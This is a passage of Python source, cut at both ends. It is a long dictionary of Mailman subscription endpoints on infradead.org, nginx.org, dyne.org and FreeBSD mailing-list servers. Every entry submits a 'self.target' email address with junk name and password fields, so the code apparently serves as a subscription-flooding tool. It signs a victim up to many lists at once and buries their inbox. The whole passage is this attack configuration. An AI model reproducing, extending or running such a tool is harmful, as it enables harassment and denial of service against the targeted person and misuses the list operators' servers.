                'url': 'https://lists.infradead.org/mailman/subscribe/lede-bugs',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/lede-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'urRlq': {
                'url': 'https://lists.infradead.org/mailman/subscribe/lede-commits',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/lede-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TbQHK': {
                'url': 'https://lists.infradead.org/mailman/subscribe/libertas-dev',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/libertas-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vrBSZ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/libical-devel',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/libical-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CSrBx': {
                'url': 'https://lists.infradead.org/mailman/subscribe/libical-interest',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/libical-interest',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xNsTZ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/libnl',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/libnl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HtWJD': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-actions',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-actions',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tJjck': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-afs',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-afs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vcteY': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-afs-cvs',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-afs-cvs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DRFhs': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-amlogic',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-amlogic',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uRxxA': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-arm',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-arm',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hcbqh': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-arm-kernel',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-arm-kernel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YKfeA': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-arm-toolchain',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-arm-toolchain',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kfajP': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-geode',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-geode',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Txjxa': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-i3c',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-i3c',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lZNXd': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-lpwan',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-lpwan',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pvwBr': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-mediatek',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-mediatek',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },

            'DTWAJ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-mtd',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-mtd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lQphc': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-mtd-cvs',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-mtd-cvs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jiJES': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-nvme',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-nvme',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AJEuV': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-parport',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-parport',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dUROl': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-pcmcia',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-pcmcia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XZpxo': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-pmfs',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-pmfs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BYxqJ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-realtek-soc',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-realtek-soc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wiWMH': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-riscv',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-riscv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HiylO': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-rockchip',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-rockchip',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OxlAN': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-rpi-kernel',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-rpi-kernel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'myKvy': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-snps-arc',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-snps-arc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WeQxv': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-um',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-um',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nBwve': {
                'url': 'https://lists.infradead.org/mailman/subscribe/linux-unisoc',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/linux-unisoc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EsNBQ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/mailman',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/mailman',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nOaiZ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/maple-tree',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/maple-tree',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RDHzh': {
                'url': 'https://lists.infradead.org/mailman/subscribe/neat',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/neat',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NNKNH': {
                'url': 'https://lists.infradead.org/mailman/subscribe/netwinder',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/netwinder',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zuTLj': {
                'url': 'https://lists.infradead.org/mailman/subscribe/openconnect-devel',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/openconnect-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AAizB': {
                'url': 'https://lists.infradead.org/mailman/subscribe/opensbi',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/opensbi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BWADR': {
                'url': 'https://lists.infradead.org/mailman/subscribe/opentv',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/opentv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yCgSg': {
                'url': 'https://lists.infradead.org/mailman/subscribe/operationcambridge',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/operationcambridge',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LWpmm': {
                'url': 'https://lists.infradead.org/mailman/subscribe/pcsclite-muscle',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/pcsclite-muscle',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CofHW': {
                'url': 'https://lists.infradead.org/mailman/subscribe/secsh',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/secsh',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'thxAy': {
                'url': 'https://lists.infradead.org/mailman/subscribe/sender-auth',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/sender-auth',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qiggJ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/skigeek',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/skigeek',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jigdc': {
                'url': 'https://lists.infradead.org/mailman/subscribe/testlist',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/testlist',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zqdyT': {
                'url': 'https://lists.infradead.org/mailman/subscribe/tin',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/tin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ycFPd': {
                'url': 'https://lists.infradead.org/mailman/subscribe/tslib',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/tslib',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OCpqC': {
                'url': 'https://lists.infradead.org/mailman/subscribe/unified-drivers',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/unified-drivers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XIFfo': {
                'url': 'https://lists.infradead.org/mailman/subscribe/usbatm',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/usbatm',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mCwmo': {
                'url': 'https://lists.infradead.org/mailman/subscribe/usbatm-commits',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/usbatm-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Oblot': {
                'url': 'https://lists.infradead.org/mailman/subscribe/users',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HDwgN': {
                'url': 'https://lists.infradead.org/mailman/subscribe/void',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/void',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TLtdH': {
                'url': 'https://lists.infradead.org/mailman/subscribe/wcn36xx',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/wcn36xx',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AUPOK': {
                'url': 'https://lists.infradead.org/mailman/subscribe/wider_void',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/wider_void',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eRSvA': {
                'url': 'https://lists.infradead.org/mailman/subscribe/wireless-regdb',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/wireless-regdb',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fsWCM': {
                'url': 'http://nginx.org/mailman/subscribe/nginx',
                'token_url': 'http://nginx.org/mailman/listinfo/nginx',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PMgwM': {
                'url': 'http://nginx.org/mailman/subscribe/nginx-announce',
                'token_url': 'http://nginx.org/mailman/listinfo/nginx-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bizIg': {
                'url': 'http://nginx.org/mailman/subscribe/nginx-devel',
                'token_url': 'http://nginx.org/mailman/listinfo/nginx-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uCDKO': {
                'url': 'http://nginx.org/mailman/subscribe/nginx-ru',
                'token_url': 'http://nginx.org/mailman/listinfo/nginx-ru',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bqsgk': {
                'url': 'http://nginx.org/mailman/subscribe/nginx-ru-announce',
                'token_url': 'http://nginx.org/mailman/listinfo/nginx-ru-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mbynD': {
                'url': 'http://nginx.org/mailman/subscribe/unit',
                'token_url': 'http://nginx.org/mailman/listinfo/unit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XiGZA': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/algosov',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/algosov',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MrTcw': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/brico',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/brico',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jCHvA': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/devuan-announce',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/devuan-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jXZjj': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/devuan-bugs',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/devuan-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pBYJt': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/devuan-discuss',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/devuan-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ponyD': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/devuan-mirrors',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/devuan-mirrors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iaHHR': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/dynebolic',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/dynebolic',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HDaLP': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/frei0r',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/frei0r',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nbvpd': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/heads',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/heads',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Pdhrl': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/libbitcoin',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/libbitcoin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Sfsiq': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/maemo-leste',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/maemo-leste',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vrhAj': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/squatconf',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/squatconf',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qTIeA': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/trasformatorio',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/trasformatorio',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EvhzB': {
                'url': 'https://mailinglists.dyne.org/cgi-bin/mailman/subscribe/unsystem',
                'token_url': 'https://mailinglists.dyne.org/cgi-bin/mailman/listinfo/unsystem',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PJbde': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/ctm-announce',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/ctm-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XNfKC': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/ctm-users',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/ctm-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mcLAT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/cvs-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/cvs-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZqyJp': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/cvs-doc',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/cvs-doc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EMgFE': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/cvs-ports',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/cvs-ports',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NFdzu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/cvs-projects',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/cvs-projects',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PFmaK': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/cvs-src',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/cvs-src',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WpcNr': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-ci',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-ci',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dKnxG': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-commits-doc-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-commits-doc-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FhObs': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-commits-ports-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-commits-ports-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yTTql': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-commits-ports-branches',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-commits-ports-branches',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KaEAZ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-commits-ports-main',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-commits-ports-main',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mvIqI': {
